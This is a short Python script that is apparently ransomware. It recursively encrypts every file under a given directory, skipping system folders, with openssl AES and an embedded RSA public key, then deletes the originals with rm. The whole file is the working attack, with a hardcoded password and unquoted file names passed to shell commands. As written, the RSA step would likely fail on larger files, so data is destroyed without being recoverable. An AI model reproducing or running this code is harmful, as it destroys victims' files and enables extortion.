import os,sys
import getpass

aes_password="ricardo"
pkeyname="public.pem"
excluded_dirs=["bin","boot","etc","usr","lib","media","dev","usr","sbin","root"]


def create_key():
	f= open(pkeyname,"w+")
	f.write('-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtS5K6YGROGa01x8HhPo2\nkaKn+Gme3ihCI7dieh09iaAphXbjhNsKuE309J8nFZKecuImfQt8bERmerd9ndom\nmIQfJSY9iCzhEOhL5xsSOfqEzFaYBTcRdpgKNQBwk7BCsRjSuN8MPvuwaPKG9FxF\nTOo5lEGz+lFUlhKeVk8YFl8KQCr7RNleQ4I+ZHp/3qWWNlD5CGY5O7h7H2j6Ylgw\nDSCmx4yO0xVEV0OHAZkyM4zZzay03/bfYpcnmWUrN2nWlRfHQ6h1uIjjCo5Xafmr\n6veSASe95V+9uU9FOGFrJggDQSX9zLzJfzUoqla429Zd6D4h2zIf0Oyu7srxRBQx\nIQIDAQAB\n-----END PUBLIC KEY-----\n')
	f.close()


def encrypt_(fname):
	os.system("openssl aes-256-cbc -pass pass:"+aes_password+" -in "+fname+" -out "+fname+".aes")
	command=("openssl rsautl -encrypt -pubin -inkey "+pkeyname+" -in "+fname+".aes -out "+fname+".rsa")
	os.system(command)
	os.system("openssl aes-256-cbc -pass pass:"+aes_password+" -in "+fname+".rsa -out "+fname+".enc")
	os.system("rm "+fname+".aes")
	os.system("rm "+fname+".rsa")
	os.system("rm "+fname)


def enc_files(dir_):
	onlyfiles = [f for f in os.listdir(dir_) if os.path.isfile(os.path.join(dir_, f))]
	for f in onlyfiles:
		file=os.path.join(dir_, f)
		print "Encrypting",file,"..."
		encrypt_(file)

def loop(looped_dir):
	create_key()
	#Files in the root dir
	enc_files(looped_dir)
	#Directories inside
	for root,directories,filenames in os.walk(looped_dir):
		for directory in directories:
			dir=os.path.join(root, directory)
			if directory not in excluded_dirs:
				print "Entering",dir,"..."
				enc_files(dir)
	os.system("rm "+pkeyname)

loop(sys.argv[1])
